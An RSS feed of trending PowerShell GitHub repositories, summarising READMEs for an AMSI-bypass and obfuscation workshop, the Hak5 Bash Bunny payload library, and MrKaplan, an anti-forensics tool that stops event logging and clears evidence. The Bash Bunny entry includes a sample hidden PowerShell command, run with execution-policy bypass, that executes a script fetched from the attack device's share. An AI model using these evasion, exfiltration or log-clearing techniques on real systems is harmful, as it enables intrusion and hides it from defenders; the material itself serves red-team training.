<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Weekly Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-08-28T01:49:08Z</updated>
  <subtitle>Weekly Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>BC-SECURITY/Beginners-Guide-to-Obfuscation</title>
    <updated>2022-08-28T01:49:08Z</updated>
    <id>tag:github.com,2022-08-28:/BC-SECURITY/Beginners-Guide-to-Obfuscation</id>
    <link href="https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Evading Detection: A Beginner&#39;s Guide to Obfuscation&lt;/h1&gt; &#xA;&lt;p&gt;Defenders are constantly adapting their security to counter new threats. Our mission is to identify how they plan on securing their systems and avoid being identified as a threat. This is a hands-on class to learn the methodology behind malware delivery and avoiding detection. This workshop explores the inner workings of Microsoft&#39;s Antimalware Scan Interface (AMSI), Windows Defender, and Event Tracing for Windows (ETW). We will learn how to employ obfuscated malware using Visual Basic (VB), PowerShell, and C# to avoid Microsoft&#39;s defenses. Students will learn to build AMSI bypass techniques, obfuscate payloads from dynamic and static signature detection methods, and learn about alternative network evasion methods.&lt;/p&gt; &#xA;&lt;h2&gt;Objectives&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Understand the use and employment of obfuscation in red teaming.&lt;/li&gt; &#xA; &lt;li&gt;Demonstrate the concept of least obfuscation.&lt;/li&gt; &#xA; &lt;li&gt;Introduce Microsoft&#39;s Antimalware Scan Interface (AMSI) and explain its importance.&lt;/li&gt; &#xA; &lt;li&gt;Demonstrate obfuscation methodology for .NET payloads.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>hak5/bashbunny-payloads</title>
    <updated>2022-08-28T01:49:08Z</updated>
    <id>tag:github.com,2022-08-28:/hak5/bashbunny-payloads</id>
    <link href="https://github.com/hak5/bashbunny-payloads" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The Official Bash Bunny Payload Repository&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Payload Library for the Bash Bunny by Hak5&lt;/h1&gt; &#xA;&lt;p&gt;This repository contains payloads and extensions for the Hak5 Bash Bunny. Community developed payloads are listed and developers are encouraged to create pull requests to make changes to or submit new payloads.&lt;/p&gt; &#xA;&lt;h2&gt;About the Bash Bunny&lt;/h2&gt; &#xA;&lt;p&gt;By emulating combinations of trusted USB devices — like gigabit Ethernet, serial, flash storage and keyboards — the Bash Bunny tricks computers into divulging data, exfiltrating documents, installing backdoors and many more exploits.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hak5.org/products/bash-bunny&#34; title=&#34;Purchase at Hak5&#34;&gt;Purchase at Hak5&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.hak5.org/bash-bunny/&#34; title=&#34;Documentation&#34;&gt;Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://forums.hak5.org/forum/92-bash-bunny/&#34; title=&#34;Forums&#34;&gt;Bash Bunny Forums&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Discord: &lt;a href=&#34;https://hak5.org/discord&#34;&gt;https://hak5.org/discord&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.shopify.com/s/files/1/0068/2142/products/bash-bunny-mk2_001_c58d9658-b151-4328-af26-11eef3c47355_300x.jpg&#34; alt=&#34;enter image description here&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;Documentation on developing payloads for the Bash Bunny can be found on the &lt;a href=&#34;https://docs.hak5.org/bash-bunny/&#34;&gt;docs.hak5.org&lt;/a&gt; website. Guides can be found on the &lt;a href=&#34;https://hak5.org/blogs/bash-bunny&#34;&gt;Bash Bunny blog&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;Generally, payloads may execute commands on your device. As such, it is possible for a payload to damage your device. Payloads from this repository are provided AS-IS without warranty. While Hak5 makes a best effort to review payloads, there are no guarantees as to their effectiveness. As with any script, you are advised to proceed with caution.&lt;/p&gt; &#xA;&lt;h2&gt;Legal&lt;/h2&gt; &#xA;&lt;p&gt;Payloads from this repository are provided for educational purposes only. Hak5 gear is intended for authorized auditing and security analysis purposes only where permitted subject to local and international laws where applicable. Users are solely responsible for compliance with all laws of their locality. Hak5 LLC and affiliates claim no responsibility for unauthorized or unlawful use.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Once you have developed your payload, you are encouraged to contribute to this repository by submitting a Pull Request. Reviewed and Approved pull requests will add your payload to this repository, where they may be publically available.&lt;/p&gt; &#xA;&lt;p&gt;Please adhere to the following best practices and style guide when submitting a payload.&lt;/p&gt; &#xA;&lt;h3&gt;Naming Conventions&lt;/h3&gt; &#xA;&lt;p&gt;Please give your payload a unique and descriptive name. Do not use spaces in payload names. Each payload should be submit into its own directory, with &lt;code&gt;-&lt;/code&gt; or &lt;code&gt;_&lt;/code&gt; used in place of spaces, to one of the categories such as exfiltration, phishing, remote_access or recon. Do not create your own category.&lt;/p&gt; &#xA;&lt;h3&gt;Binaries&lt;/h3&gt; &#xA;&lt;p&gt;Binaries may not be accepted in this repository. If a binary is used in conjunction with the payload, please document where it or its source may be obtained.&lt;/p&gt; &#xA;&lt;h3&gt;Comments&lt;/h3&gt; &#xA;&lt;p&gt;Payloads should begin with comments specifying at the very least the name of the payload and author. Additional information such as a brief description, the target, any dependencies / prerequisites and the LED status used is helpful.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Title: SMB Exfiltrator&#xA;Description: Exfiltrates files from %userprofile%\documents via SMB&#xA;Author: Hak5Darren&#xA;Target: Windows XP SP3 - Latest&#xA;Dependencies: impacket&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Configuration Options&lt;/h3&gt; &#xA;&lt;p&gt;Configurable options should be specified in variables at the top of the payload.txt file&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# Options&#xA;RESPONDER_OPTIONS=&#34;-w -r -d -P&#34;&#xA;LOOTDIR=/root/udisk/loot/quickcreds&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;LED&lt;/h3&gt; &#xA;&lt;p&gt;The payload should use common payload states rather than unique color/pattern combinations when possible with an LED command preceding the Stage or ATTACKMODE.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# Initialization&#xA;LED SETUP&#xA;GET SWITCH_POSITION&#xA;GET HOST_IP&#xA;&#xA;# Attack&#xA;LED ATTACK&#xA;ATTACKMODE HID ECM_ETHERNET&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Stages and States&lt;/h3&gt; &#xA;&lt;p&gt;Stages should be documented with comments&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# Keystroke Injection Stage&#xA;# Runs hidden powershell which executes \\172.16.64.1\s\s.ps1 when available&#xA;GET HOST_IP&#xA;LED STAGE1&#xA;ATTACKMODE HID&#xA;RUN WIN &#34;powershell -WindowStyle Hidden -Exec Bypass \&#34;while (\$true) { If (Test-Connection $HOST_IP -count 1) { \\\\$HOST_IP\\s\\s.ps1; exit } }\&#34;&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Common payload states include a &lt;code&gt;SETUP&lt;/code&gt;, with may include a &lt;code&gt;FAIL&lt;/code&gt; if certain conditions are not met. This is typically followed by either a single &lt;code&gt;ATTACK&lt;/code&gt; or multiple &lt;code&gt;STAGEs&lt;/code&gt;. More complex payloads may include a &lt;code&gt;SPECIAL&lt;/code&gt; function to wait until certain conditions are met. Payloads commonly end with a &lt;code&gt;CLEANUP&lt;/code&gt; phase, such as moving and deleting files or stopping services. A payload may &lt;code&gt;FINISH&lt;/code&gt; when the objective is complete and the device is safe to eject or turn off. These common payload states correspond to &lt;code&gt;LED&lt;/code&gt; states.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Idov31/MrKaplan</title>
    <updated>2022-08-28T01:49:08Z</updated>
    <id>tag:github.com,2022-08-28:/Idov31/MrKaplan</id>
    <link href="https://github.com/Idov31/MrKaplan" rel="alternate"></link>
    <summary type="html">&lt;p&gt;MrKaplan is a tool aimed to help red teamers to stay hidden by clearing evidence of execution.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Mr.Kaplan&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://img.shields.io/badge/powershell-5391FE?style=for-the-badge&amp;amp;logo=powershell&amp;amp;logoColor=white&#34; alt=&#34;image&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&amp;amp;logo=windows&amp;amp;logoColor=white&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Description&lt;/h2&gt; &#xA;&lt;p&gt;MrKaplan is a tool aimed to help red teamers to stay hidden by clearing evidence of execution. It works by saving information such as the time it ran, snapshot of files and associate each evidence to the related user.&lt;/p&gt; &#xA;&lt;p&gt;This tool is inspired by &lt;a href=&#34;https://github.com/mufeedvh/moonwalk&#34;&gt;MoonWalk&lt;/a&gt;, a similar tool for Unix machines.&lt;/p&gt; &#xA;&lt;p&gt;You can read more about it in the &lt;a href=&#34;https://github.com/idov31/MrKaplan/wiki&#34;&gt;wiki&lt;/a&gt; page.&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Stopping event logging.&lt;/li&gt; &#xA; &lt;li&gt;Clearing files artifacts.&lt;/li&gt; &#xA; &lt;li&gt;Clearing registry artifacts.&lt;/li&gt; &#xA; &lt;li&gt;Can run for multiple users.&lt;/li&gt; &#xA; &lt;li&gt;Can run as user and as admin (Highly recommended to run as admin).&lt;/li&gt; &#xA; &lt;li&gt;Can save timestamps of files.&lt;/li&gt; &#xA; &lt;li&gt;Can exclude certian operations and leave artifacts to blue teams.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Before you start your operations on the computer, run MrKaplan with begin flag and whenever your finish run it again with end flag.&lt;/li&gt; &#xA; &lt;li&gt;&lt;em&gt;&lt;strong&gt;DO NOT REMOVE MrKaplan registry key&lt;/strong&gt;&lt;/em&gt;, otherwise MrKaplan will not be able to use the information.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/Idov31/MrKaplan/master/Pictures/usage.png&#34;&gt; &#xA;&lt;h2&gt;IOCs&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Powershell process that access to the artifacts mentioned in the wiki page.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Powershell importing weird base64 blob.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Powershell process that performs Token Manipulation.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;MrKaplan&#39;s registry key: HKCU:\Software\MrKaplan.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Acknowledgements&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit&#34;&gt;PowerSploit&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/hlldz/Phant0m&#34;&gt;Phant0m&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ForensicArtifacts/artifacts/raw/main/data/windows.yaml&#34;&gt;ForensicArtifacts&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;I&#39;m not responsible in any way for any kind of damage that is done to your computer / program as cause of this project. I&#39;m happily accept contribution, make a pull request and I will review it!&lt;/p&gt;</summary>
  </entry>
</feed>